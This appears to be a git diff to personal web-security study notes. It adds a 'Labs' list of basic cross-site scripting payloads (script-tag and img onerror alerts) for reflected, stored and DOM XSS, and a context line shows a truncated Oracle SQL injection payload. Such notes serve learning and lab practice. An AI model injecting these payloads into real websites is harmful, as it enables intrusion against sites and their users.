@@ -73,3 +73,14 @@ UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTY
 ### Cheat Sheet
 ### Notes
 ### Labs
+```shell
+# Reflected XSS into HTML context with nothing encoded
+<script>alert(1)</script>
+# Stored XSS into HTML context with nothing encoded
+<script>alert(1)</script>
+# DOM XSS in document.write sink using source location.search
+\"><script>alert(1)</script>
+# DOM XSS in innerHTML sink using source location.search
+<img src=x onerror=alert(1)>  
+# 
+```
